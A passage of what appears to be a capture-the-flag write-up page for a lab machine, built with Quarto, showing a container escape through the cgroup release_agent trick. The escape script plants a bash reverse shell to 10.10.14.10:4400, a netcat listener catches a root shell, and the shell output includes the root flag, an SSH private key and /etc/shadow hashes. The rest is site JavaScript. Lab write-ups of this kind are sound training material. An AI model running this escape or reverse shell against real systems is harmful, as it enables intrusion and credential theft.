+<span id="cb46-6"><a href="#cb46-6" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> esc.sh</span>
+<span id="cb46-7"><a href="#cb46-7" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> /tmp/cgrp <span class="kw">&amp;&amp;</span> <span class="fu">mount</span> <span class="at">-t</span> cgroup <span class="at">-o</span> rdma cgroup /tmp/cgrp <span class="kw">&amp;&amp;</span> <span class="fu">mkdir</span> /tmp/cgrp/x</span>
+<span id="cb46-8"><a href="#cb46-8" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> 1 <span class="op">&gt;</span> /tmp/cgrp/x/notify_on_release</span>
+<span id="cb46-9"><a href="#cb46-9" aria-hidden="true" tabindex="-1"></a><span class="va">host_path</span><span class="op">=</span><span class="kw">`</span><span class="fu">sed</span> <span class="at">-n</span> <span class="st">'s/.*\perdir=\([^,]*\).*/\1/p'</span> /etc/mtab<span class="kw">`</span></span>
+<span id="cb46-10"><a href="#cb46-10" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"</span><span class="va">$host_path</span><span class="st">/cmd"</span> <span class="op">&gt;</span> /tmp/cgrp/release_agent</span>
+<span id="cb46-11"><a href="#cb46-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb46-12"><a href="#cb46-12" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">'#!/bin/sh'</span> <span class="op">&gt;</span> /cmd</span>
+<span id="cb46-13"><a href="#cb46-13" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.10/4400 0&gt;&amp;1'"</span> <span class="op">&gt;&gt;</span> /cmd</span>
+<span id="cb46-14"><a href="#cb46-14" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> a+x /cmd</span>
+<span id="cb46-15"><a href="#cb46-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb46-16"><a href="#cb46-16" aria-hidden="true" tabindex="-1"></a><span class="fu">sh</span> <span class="at">-c</span> <span class="st">"echo </span><span class="dt">\$\$</span><span class="st"> &gt; /tmp/cgrp/x/cgroup.procs"</span></span>
+<span id="cb46-17"><a href="#cb46-17" aria-hidden="true" tabindex="-1"></a><span class="fu">head</span> /output</span>
+<span id="cb46-18"><a href="#cb46-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb46-19"><a href="#cb46-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb46-20"><a href="#cb46-20" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> esc.sh</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb47"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem nc <span class="at">-lvnp</span> 4400            </span>
+<span id="cb47-2"><a href="#cb47-2" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 4400 ...</span>
+<span id="cb47-3"><a href="#cb47-3" aria-hidden="true" tabindex="-1"></a><span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.10</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.11.167]</span> 56780</span>
+<span id="cb47-4"><a href="#cb47-4" aria-hidden="true" tabindex="-1"></a><span class="ex">bash:</span> cannot set terminal process group <span class="er">(</span><span class="ex">-1</span><span class="kw">)</span><span class="bu">:</span> Inappropriate ioctl for device</span>
+<span id="cb47-5"><a href="#cb47-5" aria-hidden="true" tabindex="-1"></a><span class="ex">bash:</span> no job control in this shell</span>
+<span id="cb47-6"><a href="#cb47-6" aria-hidden="true" tabindex="-1"></a><span class="ex">root@carpediem:/#</span> id <span class="kw">&amp;&amp;</span> <span class="fu">hostname</span></span>
+<span id="cb47-7"><a href="#cb47-7" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span></span>
+<span id="cb47-8"><a href="#cb47-8" aria-hidden="true" tabindex="-1"></a><span class="ex">carpediem</span></span>
+<span id="cb47-9"><a href="#cb47-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb47-10"><a href="#cb47-10" aria-hidden="true" tabindex="-1"></a><span class="ex">root@carpediem:/#</span> cat /root/root.txt</span>
+<span id="cb47-11"><a href="#cb47-11" aria-hidden="true" tabindex="-1"></a><span class="ex">c57deb2eb7b17c84a0e40dc099b0bb70</span></span>
+<span id="cb47-12"><a href="#cb47-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb47-13"><a href="#cb47-13" aria-hidden="true" tabindex="-1"></a><span class="ex">root@carpediem:/#</span> cat /root/.ssh/id_rsa</span>
+<span id="cb47-14"><a href="#cb47-14" aria-hidden="true" tabindex="-1"></a><span class="ex">-----BEGIN</span> OPENSSH PRIVATE KEY-----</span>
+<span id="cb47-15"><a href="#cb47-15" aria-hidden="true" tabindex="-1"></a><span class="ex">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span></span>
+<span id="cb47-16"><a href="#cb47-16" aria-hidden="true" tabindex="-1"></a><span class="ex">NhAAAAAwEAAQAAAYEAn4XMDVkBUi5Cch7+bhxOLQzqofUIElWw6wNQ2MNZIi3QTUYE0cSn</span></span>
+<span id="cb47-17"><a href="#cb47-17" aria-hidden="true" tabindex="-1"></a><span class="ex">rCrrVSGKt1BRWrXlNjanoGJGvfENm02L+Dm9dUPbFaJjcFBG80DjrWsVfkCYSwe3g9KjCk</span></span>
+<span id="cb47-18"><a href="#cb47-18" aria-hidden="true" tabindex="-1"></a><span class="ex">kqXrHXtapCgERNCga82snoEgYN3z9vmsrw/nd2D6OVsQxkIck7bzC2+p2EinjhaY9BVtO0</span></span>
+<span id="cb47-19"><a href="#cb47-19" aria-hidden="true" tabindex="-1"></a><span class="ex">UVkcDrMBvRq64JOkHHktYEBF95SDRHav1JW6M/wY6lan18Zfrc2x0c+Ktavpp6KwHVXOcJ</span></span>
+<span id="cb47-20"><a href="#cb47-20" aria-hidden="true" tabindex="-1"></a><span class="ex">veuChxMfbWOgyaubMV57iZ828vloyoUZRy4OlZr0Jxe5FQGcxWT2/nhWKU3uo4Vi/mSWha</span></span>
+<span id="cb47-21"><a href="#cb47-21" aria-hidden="true" tabindex="-1"></a><span class="ex">hNMY8s+ip7y9lJZZ4/ZnN0nkkriO5xWwJu4+FEwDM9a2ZVbpfRAqcCNVQR5atHaGLl3pM6</span></span>
+<span id="cb47-22"><a href="#cb47-22" aria-hidden="true" tabindex="-1"></a><span class="ex">LDpyN9i95ks03BOo/9U6SULuWK/IfQjzlCLP28EJBb6W5cMBvB+yZSAGJ15fKYv2+9c4dj</span></span>
+<span id="cb47-23"><a href="#cb47-23" aria-hidden="true" tabindex="-1"></a><span class="ex">JLefRpTq65BzjwUIxseflmyTL08WYGzSB9amCsHzAAAFiCMHoVMjB6FTAAAAB3NzaC1yc2</span></span>
+<span id="cb47-24"><a href="#cb47-24" aria-hidden="true" tabindex="-1"></a><span class="ex">EAAAGBAJ+FzA1ZAVIuQnIe/m4cTi0M6qH1CBJVsOsDUNjDWSIt0E1GBNHEp6wq61UhirdQ</span></span>
+<span id="cb47-25"><a href="#cb47-25" aria-hidden="true" tabindex="-1"></a><span class="ex">UVq15TY2p6BiRr3xDZtNi/g5vXVD2xWiY3BQRvNA461rFX5AmEsHt4PSowpJKl6x17WqQo</span></span>
+<span id="cb47-26"><a href="#cb47-26" aria-hidden="true" tabindex="-1"></a><span class="ex">BETQoGvNrJ6BIGDd8/b5rK8P53dg+jlbEMZCHJO28wtvqdhIp44WmPQVbTtFFZHA6zAb0a</span></span>
+<span id="cb47-27"><a href="#cb47-27" aria-hidden="true" tabindex="-1"></a><span class="ex">uuCTpBx5LWBARfeUg0R2r9SVujP8GOpWp9fGX63NsdHPirWr6aeisB1VznCb3rgocTH21j</span></span>
+<span id="cb47-28"><a href="#cb47-28" aria-hidden="true" tabindex="-1"></a><span class="ex">oMmrmzFee4mfNvL5aMqFGUcuDpWa9CcXuRUBnMVk9v54VilN7qOFYv5kloWoTTGPLPoqe8</span></span>
+<span id="cb47-29"><a href="#cb47-29" aria-hidden="true" tabindex="-1"></a><span class="ex">vZSWWeP2ZzdJ5JK4jucVsCbuPhRMAzPWtmVW6X0QKnAjVUEeWrR2hi5d6TOiw6cjfYveZL</span></span>
+<span id="cb47-30"><a href="#cb47-30" aria-hidden="true" tabindex="-1"></a><span class="ex">NNwTqP/VOklC7livyH0I85Qiz9vBCQW+luXDAbwfsmUgBideXymL9vvXOHYyS3n0aU6uuQ</span></span>
+<span id="cb47-31"><a href="#cb47-31" aria-hidden="true" tabindex="-1"></a><span class="ex">c48FCMbHn5Zsky9PFmBs0gfWpgrB8wAAAAMBAAEAAAGAMg6VIlccoAIeHZt2MW02ZtKXye</span></span>
+<span id="cb47-32"><a href="#cb47-32" aria-hidden="true" tabindex="-1"></a><span class="ex">yO9Nno40YuF2btUFlZ9PWUy5JPHyp0oEkfMzjD3pgXbfSmkyBjnHTI1UP3ORQ9TE/Xrqk/</span></span>
+<span id="cb47-33"><a href="#cb47-33" aria-hidden="true" tabindex="-1"></a><span class="ex">VN4L9YcWKrPgkbaJU3n/byEowjCFWCOsUbg0l/VWy1+j4W/cH9PAhJ5uUf9+sgsgg/XMIj</span></span>
+<span id="cb47-34"><a href="#cb47-34" aria-hidden="true" tabindex="-1"></a><span class="ex">uGLEfuG40IzgmhrqYR7cLjOPDDs4cn08D+Oa3qmFAb/kdUItDoY7E5o8EumaHGRUvFMbux</span></span>
+<span id="cb47-35"><a href="#cb47-35" aria-hidden="true" tabindex="-1"></a><span class="ex">fXclTO+v7euXVjy03EKjTCL9poucY51N9XXPzqWnMq+2e2ajQwbURSsWJ8TpvHy/0eDfUJ</span></span>
+<span id="cb47-36"><a href="#cb47-36" aria-hidden="true" tabindex="-1"></a><span class="ex">kyOMSNAtouZczSsipukJehuoMgn169HoIHNov1mx6n5clSBhmkAAcyXqqIoW/Qh/7HYWa+</span></span>
+<span id="cb47-37"><a href="#cb47-37" aria-hidden="true" tabindex="-1"></a><span class="ex">k0t/CKrG166DJ+DGPZbWQhWAepEKkD2QXDFJB2nY0j46InBRaKSyyqId5CKRmjQy8WuqtM</span></span>
+<span id="cb47-38"><a href="#cb47-38" aria-hidden="true" tabindex="-1"></a><span class="ex">NuCn623pVXUWrsEvWeVp881h1f2t8ZBHl09mFBNTBCfnwu5Y68HQhn3biU8Zmajk5xAAAA</span></span>
+<span id="cb47-39"><a href="#cb47-39" aria-hidden="true" tabindex="-1"></a><span class="ex">wByZ9i3MAdkAeBO59jhWcB7G14KXvlo2jyr0ZStsMH/on63EZJo6t2uLnzq7WFkY3fqf6v</span></span>
+<span id="cb47-40"><a href="#cb47-40" aria-hidden="true" tabindex="-1"></a><span class="ex">Tdp1ba9WA9RINMp5yd5BnITcees+VnoWQGJ3DjYXdUSES5dBejxOHoNCzF8QG7MAVnMCe+</span></span>
+<span id="cb47-41"><a href="#cb47-41" aria-hidden="true" tabindex="-1"></a><span class="ex">yyrGyMW1sKnWWQJW9Ni6HEPDKnvj/hYZBI6OKST/Pebcz8lRfMgbOsb9GheaDL6zEx9KX/</span></span>
+<span id="cb47-42"><a href="#cb47-42" aria-hidden="true" tabindex="-1"></a><span class="ex">7y0HYBjm8VK9nzBjKRfnVpfBjBrQeD43YiRt+HB1a8C4ZGTQAAAMEAz1X60hD50s4/CBlh</span></span>
+<span id="cb47-43"><a href="#cb47-43" aria-hidden="true" tabindex="-1"></a><span class="ex">A8Hw62Zpqqpb7eMmqRr2nLc4u/8T3aPwS9YxgoYh9S/R2WCZdujT0xVacNNJ86S/QiNefq</span></span>
+<span id="cb47-44"><a href="#cb47-44" aria-hidden="true" tabindex="-1"></a><span class="ex">lrA5JoTS8cFB0ysqCzJeoOn109tyowui4Vv4iptx+id+u0l/FazLwXTVZJJeks3WSI3OmS</span></span>
+<span id="cb47-45"><a href="#cb47-45" aria-hidden="true" tabindex="-1"></a><span class="ex">PnWQwB1vF3hrEe8LP55GEl4Jh+FiyP6WNup9satmGzcGCyKd0txwenq4PsYJ+uSNrPH/Hi</span></span>
+<span id="cb47-46"><a href="#cb47-46" aria-hidden="true" tabindex="-1"></a><span class="ex">s89hVBwEeVkkTDP0rBc4IEQ1V/1Gt5AAAAwQDE9udhbjBnmmKHOv3G7FG9+xjGLCwZqZIy</span></span>
+<span id="cb47-47"><a href="#cb47-47" aria-hidden="true" tabindex="-1"></a><span class="ex">AU57jRp1TOjVm0DSnGyUhqb79tkWCjd4OVnrFQpE/yKiynvVNPoynwc9mIoM+QO3UF7ZXl</span></span>
+<span id="cb47-48"><a href="#cb47-48" aria-hidden="true" tabindex="-1"></a><span class="ex">+PKqszyJiYywpHZAmZXm8f5/Kol+R/2SI7sPlq4ripwiOv8F5CwoP/kf2Dgl9ryCCvo+lL</span></span>
+<span id="cb47-49"><a href="#cb47-49" aria-hidden="true" tabindex="-1"></a><span class="ex">siB8rSQLuY6TXBfs+IZfggGO8Xn1JZWaF7J68DjWXo8GNdwwjdpjnoFxmBU3cEZYFjbjYB</span></span>
+<span id="cb47-50"><a href="#cb47-50" aria-hidden="true" tabindex="-1"></a><span class="va">okkXD85q0KkcsAAAAOcm9vdEBjYXJwZWRpZW0BAgMEBQ</span><span class="op">=</span>=</span>
+<span id="cb47-51"><a href="#cb47-51" aria-hidden="true" tabindex="-1"></a><span class="ex">-----END</span> OPENSSH PRIVATE KEY-----</span>
+<span id="cb47-52"><a href="#cb47-52" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb47-53"><a href="#cb47-53" aria-hidden="true" tabindex="-1"></a><span class="ex">root@carpediem:/#</span> cat /etc/shadow</span>
+<span id="cb47-54"><a href="#cb47-54" aria-hidden="true" tabindex="-1"></a><span class="ex">root:</span><span class="va">$6$y5QrvfE3csMMok1t$DvYGED3VsftC3ylIHA8yGVg2j2KiP7uooPn309LahXXPEZulnVWBwwKLorPdiW5snCgWEYN6F24b8LQALG1CD1</span><span class="ex">:19081:0:99999:7:::</span></span>
+<span id="cb47-55"><a href="#cb47-55" aria-hidden="true" tabindex="-1"></a><span class="ex">hflaccus:</span><span class="va">$6$Y3pKa50HWcGkr</span><span class="ex">/KE</span><span class="va">$ZBG57pq5RIwDs9l75xJMz5Cv2SweVTFOcsv3WzRLC9c</span><span class="ex">/QRX7wSgNT/XekUYEx</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+
+
+</section>
+</section>
+
+</main> <!-- /main -->
+<script id="quarto-html-after-body" type="application/javascript">
+window.document.addEventListener("DOMContentLoaded", function (event) {
+  const toggleBodyColorMode = (bsSheetEl) => {
+    const mode = bsSheetEl.getAttribute("data-mode");
+    const bodyEl = window.document.querySelector("body");
+    if (mode === "dark") {
+      bodyEl.classList.add("quarto-dark");
+      bodyEl.classList.remove("quarto-light");
+    } else {
+      bodyEl.classList.add("quarto-light");
+      bodyEl.classList.remove("quarto-dark");
+    }
+  }
+  const toggleBodyColorPrimary = () => {
+    const bsSheetEl = window.document.querySelector("link#quarto-bootstrap");
+    if (bsSheetEl) {
+      toggleBodyColorMode(bsSheetEl);
+    }
+  }
+  toggleBodyColorPrimary();  
+  const icon = "";
+  const anchorJS = new window.AnchorJS();
+  anchorJS.options = {
+    placement: 'right',
+    icon: icon
+  };
+  anchorJS.add('.anchored');
+  const isCodeAnnotation = (el) => {
+    for (const clz of el.classList) {
+      if (clz.startsWith('code-annotation-')) {                     
+        return true;
+      }
+    }
+    return false;
+  }
+  const onCopySuccess = function(e) {
+    // button target
+    const button = e.trigger;
+    // don't keep focus
+    button.blur();
+    // flash "checked"
+    button.classList.add('code-copy-button-checked');
+    var currentTitle = button.getAttribute("title");
+    button.setAttribute("title", "Copied!");
+    let tooltip;
+    if (window.bootstrap) {
+      button.setAttribute("data-bs-toggle", "tooltip");
+      button.setAttribute("data-bs-placement", "left");
+      button.setAttribute("data-bs-title", "Copied!");
+      tooltip = new bootstrap.Tooltip(button, 
+        { trigger: "manual", 
+          customClass: "code-copy-button-tooltip",
+          offset: [0, -8]});
+      tooltip.show();    
+    }
+    setTimeout(function() {
+      if (tooltip) {
+        tooltip.hide();
+        button.removeAttribute("data-bs-title");
+        button.removeAttribute("data-bs-toggle");
+        button.removeAttribute("data-bs-placement");
+      }
+      button.setAttribute("title", currentTitle);
+      button.classList.remove('code-copy-button-checked');
+    }, 1000);
+    // clear code selection
+    e.clearSelection();
+  }
+  const getTextToCopy = function(trigger) {
+      const codeEl = trigger.previousElementSibling.cloneNode(true);
+      for (const childEl of codeEl.children) {
+        if (isCodeAnnotation(childEl)) {
+          childEl.remove();
+        }
+      }
+      return codeEl.innerText;
+  }
+  const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
+    text: getTextToCopy
+  });
+  clipboard.on('success', onCopySuccess);
+  if (window.document.getElementById('quarto-embedded-source-code-modal')) {
+    // For code content inside modals, clipBoardJS needs to be initialized with a container option
+    // TODO: Check when it could be a function (https://github.com/zenorocha/clipboard.js/issues/860)
+    const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
+      text: getTextToCopy,
+      container: window.document.getElementById('quarto-embedded-source-code-modal')
+    });
+    clipboardModal.on('success', onCopySuccess);
+  }
+    var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
+    var mailtoRegex = new RegExp(/^mailto:/);
+      var filterRegex = new RegExp("https:\/\/exploit\.se");
+    var isInternal = (href) => {
+        return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
+    }
+    // Inspect non-navigation links and adorn them if external
+ 	var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
+    for (var i=0; i<links.length; i++) {
+      const link = links[i];
+      if (!isInternal(link.href)) {
+        // undo the damage that might have been done by quarto-nav.js in the case of
+        // links that we want to consider external
+        if (link.dataset.originalHref !== undefined) {
+          link.href = link.dataset.originalHref;
+        }
+      }
+    }
+  function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
+    const config = {
+      allowHTML: true,
+      maxWidth: 500,
+      delay: 100,
+      arrow: false,
+      appendTo: function(el) {
+          return el.parentElement;
+      },
+      interactive: true,
+      interactiveBorder: 10,
+      theme: 'quarto',
+      placement: 'bottom-start',
+    };
+    if (contentFn) {
+      config.content = contentFn;
+    }
+    if (onTriggerFn) {
+      config.onTrigger = onTriggerFn;
+    }
+    if (onUntriggerFn) {
+      config.onUntrigger = onUntriggerFn;
+    }
+    window.tippy(el, config); 
+  }
+  const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
+  for (var i=0; i<noterefs.length; i++) {
+    const ref = noterefs[i];
+    tippyHover(ref, function() {
+      // use id or data attribute instead here
+      let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
+      try { href = new URL(href).hash; } catch {}
+      const id = href.replace(/^#\/?/, "");
+      const note = window.document.getElementById(id);
+      if (note) {
+        return note.innerHTML;
+      } else {
+        return "";
+      }
+    });
+  }
+  const xrefs = window.document.querySelectorAll('a.quarto-xref');
+  const processXRef = (id, note) => {
+    // Strip column container classes
+    const stripColumnClz = (el) => {
+      el.classList.remove("page-full", "page-columns");
+      if (el.children) {
+        for (const child of el.children) {
+          stripColumnClz(child);
+        }
+      }
+    }
+    stripColumnClz(note)
+    if (id === null || id.startsWith('sec-')) {
+      // Special case sections, only their first couple elements
+      const container = document.createElement("div");
+      if (note.children && note.children.length > 2) {
+        container.appendChild(note.children[0].cloneNode(true));
+        for (let i = 1; i < note.children.length; i++) {
+          const child = note.children[i];
+          if (child.tagName === "P" && child.innerText === "") {
+            continue;
+          } else {
+            container.appendChild(child.cloneNode(true));
+            break;
+          }
+        }
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(container);
+        }
+        return container.innerHTML
+      } else {
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(note);
+        }
+        return note.innerHTML;
+      }
+    } else {
+      // Remove any anchor links if they are present
+      const anchorLink = note.querySelector('a.anchorjs-link');
+      if (anchorLink) {
+        anchorLink.remove();
+      }
+      if (window.Quarto?.typesetMath) {
+        window.Quarto.typesetMath(note);
+      }
+      // TODO in 1.5, we should make sure this works without a callout special case
+      if (note.classList.contains("callout")) {
+        return note.outerHTML;
+      } else {
+        return note.innerHTML;
+      }
+    }
+  }
+  for (var i=0; i<xrefs.length; i++) {
+    const xref = xrefs[i];
+    tippyHover(xref, undefined, function(instance) {
+      instance.disable();
+      let url = xref.getAttribute('href');
+      let hash = undefined; 
+      if (url.startsWith('#')) {
+        hash = url;
+      } else {
+        try { hash = new URL(url).hash; } catch {}
+      }
+      if (hash) {
+        const id = hash.replace(/^#\/?/, "");
+        const note = window.document.getElementById(id);
+        if (note !== null) {
+          try {
+            const html = processXRef(id, note.cloneNode(true));
+            instance.setContent(html);
+          } finally {
+            instance.enable();
+            instance.show();
+          }
+        } else {
+          // See if we can fetch this
+          fetch(url.split('#')[0])
+          .then(res => res.text())
+          .then(html => {
+            const parser = new DOMParser();
+            const htmlDoc = parser.parseFromString(html, "text/html");
+            const note = htmlDoc.getElementById(id);
+            if (note !== null) {
+              const html = processXRef(id, note);
+              instance.setContent(html);
+            } 
+          }).finally(() => {
+            instance.enable();
+            instance.show();
+          });
+        }
+      } else {
+        // See if we can fetch a full url (with no hash to target)
+        // This is a special case and we should probably do some content thinning / targeting
+        fetch(url)
+        .then(res => res.text())
+        .then(html => {
+          const parser = new DOMParser();
+          const htmlDoc = parser.parseFromString(html, "text/html");
+          const note = htmlDoc.querySelector('main.content');
+          if (note !== null) {
+            // This should only happen for chapter cross references
+            // (since there is no id in the URL)
+            // remove the first header
+            if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
+              note.children[0].remove();
+            }
+            const html = processXRef(null, note);
+            instance.setContent(html);
+          } 
+        }).finally(() => {
+          instance.enable();
+          instance.show();
+        });
+      }
+    }, function(instance) {
+    });
+  }
+      let selectedAnnoteEl;
+      const selectorForAnnotation = ( cell, annotation) => {
+        let cellAttr = 'data-code-cell="' + cell + '"';
+        let lineAttr = 'data-code-annotation="' +  annotation + '"';
+        const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
+        return selector;
+      }
+      const selectCodeLines = (annoteEl) => {
+        const doc = window.document;
+        const targetCell = annoteEl.getAttribute("data-target-cell");
+        const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
+        const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
+        const lines = annoteSpan.getAttribute("data-code-lines").split(",");
+        const lineIds = lines.map((line) => {
+          return targetCell + "-" + line;
+        })
+        let top = null;
+        let height = null;
+        let parent = null;
+        if (lineIds.length > 0) {
+            //compute the position of the single el (top and bottom and make a div)
+            const el = window.document.getElementById(lineIds[0]);
+            top = el.offsetTop;
+            height = el.offsetHeight;
+            parent = el.parentElement.parentElement;
+          if (lineIds.length > 1) {
+            const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
+            const bottom = lastEl.offsetTop + lastEl.offsetHeight;
+            height = bottom - top;
+          }
+          if (top !== null && height !== null && parent !== null) {
+            // cook up a div (if necessary) and position it 
+            let div = window.document.getElementById("code-annotation-line-highlight");
+            if (div === null) {
+              div = window.document.createElement("div");
+              div.setAttribute("id", "code-annotation-line-highlight");
+              div.style.position = 'absolute';
+              parent.appendChild(div);
+            }
+            div.style.top = top - 2 + "px";
+            div.style.height = height + 4 + "px";
+            div.style.left = 0;
+            let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
+            if (gutterDiv === null) {
+              gutterDiv = window.document.createElement("div");
+              gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
+              gutterDiv.style.position = 'absolute';
+              const codeCell = window.document.getElementById(targetCell);
+              const gutter = codeCell.querySelector('.code-annotation-gutter');
+              gutter.appendChild(gutterDiv);
+            }
+            gutterDiv.style.top = top - 2 + "px";
+            gutterDiv.style.height = height + 4 + "px";
+          }
+          selectedAnnoteEl = annoteEl;
+        }
+      };
+      const unselectCodeLines = () => {
+        const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
+        elementsIds.forEach((elId) => {
+          const div = window.document.getElementById(elId);
+          if (div) {
+            div.remove();
+          }
+        });
+        selectedAnnoteEl = undefined;
+      };
+        // Handle positioning of the toggle
+    window.addEventListener(
+      "resize",
+      throttle(() => {
+        elRect = undefined;
+        if (selectedAnnoteEl) {
+          selectCodeLines(selectedAnnoteEl);
+        }
+      }, 10)
+    );
+    function throttle(fn, ms) {
+    let throttle = false;
+    let timer;
+      return (...args) => {
+        if(!throttle) { // first call gets through
+            fn.apply(this, args);
+            throttle = true;
+        } else { // all the others get throttled
+            if(timer) clearTimeout(timer); // cancel #2
+            timer = setTimeout(() => {
+              fn.apply(this, args);
+              timer = throttle = false;
+            }, ms);
+        }
+      };
+    }
+      // Attach click handler to the DT
+      const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
+      for (const annoteDlNode of annoteDls) {
+        annoteDlNode.addEventListener('click', (event) => {
+          const clickedEl = event.target;
+          if (clickedEl !== selectedAnnoteEl) {
+            unselectCodeLines();
+            const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
+            if (activeEl) {
+              activeEl.classList.remove('code-annotation-active');
+            }
+            selectCodeLines(clickedEl);
+            clickedEl.classList.add('code-annotation-active');
+          } else {
+            // Unselect the line
+            unselectCodeLines();
+            clickedEl.classList.remove('code-annotation-active');
+          }
+        });
+      }
+  const findCites = (el) => {
+    const parentEl = el.parentElement;
+    if (parentEl) {
+      const cites = parentEl.dataset.cites;
+      if (cites) {
+        return {
+          el,
+          cites: cites.split(' ')
+        };
+      } else {
+        return findCites(el.parentElement)
+      }
+    } else {
+      return undefined;
+    }
+  };
+  var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
+  for (var i=0; i<bibliorefs.length; i++) {
+    const ref = bibliorefs[i];
+    const citeInfo = findCites(ref);
+    if (citeInfo) {
+      tippyHover(citeInfo.el, function() {
+        var popup = window.document.createElement('div');
+        citeInfo.cites.forEach(function(cite) {
+          var citeDiv = window.document.createElement('div');
+          citeDiv.classList.add('hanging-indent');
+          citeDiv.classList.add('csl-entry');
+          var biblioDiv = window.document.getElementById('ref-' + cite);
+          if (biblioDiv) {
+            citeDiv.innerHTML = biblioDiv.innerHTML;
+          }
+          popup.appendChild(citeDiv);
+        });
+        return popup.innerHTML;
+      });
+    }
+  }
+});
+</script>
+</div> <!-- /content -->
+
+
+
+
+</body></html>
